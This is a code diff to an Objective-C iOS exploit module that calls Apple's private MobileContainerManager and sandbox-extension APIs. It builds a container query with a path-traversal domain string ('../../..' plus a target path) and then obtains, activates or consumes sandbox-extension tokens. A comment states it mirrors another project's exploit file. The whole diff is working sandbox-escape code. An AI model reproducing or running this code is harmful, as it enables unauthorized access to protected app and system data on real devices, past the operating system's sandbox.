@@ -12,17 +12,23 @@
 #import <stdio.h>
 #import <stdlib.h>
 #import <string.h>
+#import <xpc/xpc.h>
 
 // ---------------------------------------------------------------------------
 // Private MobileContainerManager C API (libsystem_containermanager.dylib)
 // ---------------------------------------------------------------------------
+//
+// The identifier setters take an XPC string, not a C string. Passing a raw
+// char* makes the daemon-side decoder treat it as an XPC object and the
+// process dies on the first setter (iOS 27). This mirrors 3105's
+// ThreeOneOSFive/exploit/mcm_bridge.m exactly.
 
 typedef void *(*zdma_query_create_fn)(void);
-typedef void (*zdma_query_set_class_fn)(void *, unsigned);
-typedef void (*zdma_query_set_ids_fn)(void *, const char *);
-typedef void (*zdma_query_set_group_fn)(void *, const char *);
+typedef void (*zdma_query_set_class_fn)(void *, uint64_t);
+typedef void (*zdma_query_set_ids_fn)(void *, xpc_object_t);
+typedef void (*zdma_query_set_group_fn)(void *, xpc_object_t);
 typedef void (*zdma_query_set_flags_fn)(void *, uint64_t);
-typedef void (*zdma_query_set_part_fn)(void *, unsigned);
+typedef void (*zdma_query_set_part_fn)(void *, uint64_t);
 typedef void (*zdma_query_set_domain_fn)(void *, const char *);
 typedef void *(*zdma_query_get_single_fn)(void *);
 typedef void *(*zdma_query_get_error_fn)(void *);
@@ -139,12 +145,23 @@ static void zdma_load_api(void) {
         ZDMA_LOAD(copy_token,       "container_copy_sandbox_token");
         ZDMA_LOAD(object_activate,  "container_object_sandbox_extension_activate");
         ZDMA_LOAD(object_free,      "container_object_free");
-        ZDMA_LOAD(ext_consume,      "sandbox_extension_consume");
-        ZDMA_LOAD(ext_release,      "sandbox_extension_release");
 #undef ZDMA_LOAD
 
+        // libsystem_sandbox, not libsystem_containermanager. Prefer the global
+        // namespace (libSystem re-exports it) and fall back to the handle.
+        gAPI.ext_consume = (zdma_ext_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+        if (!gAPI.ext_consume) {
+            gAPI.ext_consume = (zdma_ext_consume_fn)dlsym(gAPI.handle, "sandbox_extension_consume");
+        }
+        gAPI.ext_release = (zdma_ext_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+        if (!gAPI.ext_release) {
+            gAPI.ext_release = (zdma_ext_release_fn)dlsym(gAPI.handle, "sandbox_extension_release");
+        }
+
         gAPI.loaded = gAPI.query_create && gAPI.set_class && gAPI.set_identifiers &&
-                      gAPI.set_flags && gAPI.get_single && gAPI.query_free;
+                      gAPI.set_flags && gAPI.get_single && gAPI.query_free &&
+                      gAPI.get_path && gAPI.object_copy && gAPI.copy_token &&
+                      gAPI.object_activate && gAPI.object_free;
     });
 }
 
@@ -246,13 +263,24 @@ static int64_t zdma_bad_query(const char *path, bool skipLstat, NSString *group,
     void *query = gAPI.query_create();
     if (!query) return -2;
 
-    NSString *groupValue = group.length ? group : @"systemgroup.com.apple.mobilegestaltcache";
-    gAPI.set_class(query, group.length ? 13 : 7);
-    gAPI.set_group(query, groupValue.UTF8String);
+    BOOL hasGroup = group.length != 0;
+    NSString *groupValue = hasGroup ? group : @"systemgroup.com.apple.mobilegestaltcache";
+    // 3105's bad_query.c: class 13 for the default gestalt system group,
+    // class 7 when the caller supplies a group.
+    gAPI.set_class(query, hasGroup ? 7 : 13);
+    xpc_object_t groupIdentifier = xpc_string_create(groupValue.UTF8String);
+    if (!groupIdentifier) {
+        gAPI.query_free(query);
+        return -2;
+    }
+    gAPI.set_group(query, groupIdentifier);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(groupIdentifier);
+#endif
     gAPI.set_part(query, 3);
 
     char *domain = NULL;
-    const char *format = group.length
+    const char *format = hasGroup
         ? "../../../../../../../../..%s"   // 9 x ..
         : "../../../../../../../..%s";     // 8 x ..
     if (asprintf(&domain, format, path) < 0 || domain == NULL) {
@@ -322,8 +350,20 @@ static ZDMAContainerLease *zdma_lease_for_bundle(NSString *bundleID, NSString **
 
     zdma_trace(@"lease:set-class");
     gAPI.set_class(query, 2);
+
     zdma_trace(@"lease:set-ids");
-    gAPI.set_identifiers(query, bundleID.UTF8String);
+    xpc_object_t identifier = xpc_string_create(bundleID.UTF8String);
+    if (!identifier) {
+        if (failure) *failure = @"xpc_string_create dështoi";
+        zdma_trace(@"lease:ids-xpc-null");
+        gAPI.query_free(query);
+        return nil;
+    }
+    gAPI.set_identifiers(query, identifier);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(identifier);
+#endif
+
     zdma_trace(@"lease:set-flags");
     gAPI.set_flags(query, 0x900000000ULL);
     zdma_trace(@"lease:set-part");
@@ -357,33 +397,44 @@ static ZDMAContainerLease *zdma_lease_for_bundle(NSString *bundleID, NSString **
     }
     zdma_trace([NSString stringWithFormat:@"lease:path %@", path]);
 
-    void *retained = gAPI.object_copy ? gAPI.object_copy(result) : NULL;
+    // Match 3105's MCMRetainedLease.activate:: re-query, copy the object,
+    // check the token, then let the daemon activate the extension.
+    void *activationResult = gAPI.get_single(query);
+    void *retained = activationResult ? gAPI.object_copy(activationResult) : NULL;
     zdma_trace(retained ? @"lease:copied" : @"lease:copy-null");
+    if (!retained) {
+        if (failure) *failure = @"container_object_copy ktheu null";
+        zdma_trace(@"lease:no-activation-object");
+        gAPI.query_free(query);
+        return nil;
+    }
+
+    char *token = gAPI.copy_token(retained);
+    bool tokenPresent = token && token[0] != '\0';
+    zdma_trace(tokenPresent ? @"lease:token" : @"lease:no-token");
 
     bool activated = false;
-    if (gAPI.object_activate && retained) {
+    if (tokenPresent) {
         zdma_trace(@"lease:activating");
         activated = gAPI.object_activate(retained, false);
         zdma_trace(activated ? @"lease:activated" : @"lease:activate-false");
     }
 
     int64_t handle = -1;
-    if (!activated && retained && gAPI.copy_token && gAPI.ext_consume) {
-        char *token = gAPI.copy_token(retained);
-        if (token) {
-            if (token[0] != '\0') {
-                zdma_trace(@"lease:consuming-token");
-                handle = gAPI.ext_consume(token);
-                zdma_trace([NSString stringWithFormat:@"lease:consumed=%lld", (long long)handle]);
-            }
-            free(token);
-        }
+    if (!activated && tokenPresent && gAPI.ext_consume) {
+        zdma_trace(@"lease:consuming-token");
+        handle = gAPI.ext_consume(token);
+        zdma_trace([NSString stringWithFormat:@"lease:consumed=%lld",
+                    (long long)handle]);
     }
+    if (token) free(token);
 
     if (!activated && handle < 0) {
-        if (retained && gAPI.object_free) gAPI.object_free(retained);
+        gAPI.object_free(retained);
         gAPI.query_free(query);
-        if (failure) *failure = @"sandbox extension nuk u aktivizua";
+        if (failure) *failure = tokenPresent
+            ? @"sandbox extension nuk u aktivizua"
+            : @"MCM object nuk përmban sandbox token";
         zdma_trace(@"lease:no-extension");
         return nil;
     }
